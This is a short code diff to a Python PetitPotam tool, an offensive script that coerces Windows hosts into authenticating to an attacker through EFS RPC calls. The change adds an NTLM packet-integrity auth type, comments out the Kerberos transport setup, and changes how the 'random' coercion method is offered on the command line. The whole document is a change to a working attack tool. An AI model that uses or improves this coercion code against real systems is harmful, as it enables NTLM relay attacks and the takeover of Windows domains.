@@ -22,7 +22,7 @@ import logging
 import random
 import sys
 
-from impacket import system_errors, version
+from impacket import ntlm, system_errors, version
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.dtypes import (
     BOOL,
@@ -447,7 +447,6 @@ class PetitPotam:
         "FileKeyInfo": hEfsRpcFileKeyInfo,
         "DuplicateEncryptionInfoFile": hEfsRpcDuplicateEncryptionInfoFile,
         "AddUsersToFileEx": hEfsRpcAddUsersToFileEx,
-        "random": None,
     }
 
     def __init__(
@@ -490,12 +489,15 @@ class PetitPotam:
             self.nthash,
         )
 
-        rpctransport.set_kerberos(self.do_kerberos, kdcHost=self.dc_host)
+        # rpctransport.set_kerberos(self.do_kerberos, kdcHost=self.dc_host)
+
+        # rpctransport.set_auth_type(ntlm.NTLM_AUTH_PKT_INTEGRITY)
 
         rpctransport.setRemoteHost(self.target_ip)
         rpctransport.set_dport(self.port)
 
         dce = rpctransport.get_dce_rpc()
+        dce.set_auth_type(ntlm.NTLM_AUTH_PKT_INTEGRITY)
 
         logging.debug("Connecting to %s" % (repr(stringbinding)))
 
@@ -589,7 +591,7 @@ if __name__ == "__main__":
     group.add_argument(
         "-method",
         action="store",
-        choices=list(map(lambda x: x[0], PetitPotam.TECHNIQUES.items())),
+        choices=["random", *list(map(lambda x: x[0], PetitPotam.TECHNIQUES.items()))],
         metavar="method",
         default="random",
         help="Method used for coercing authentication",
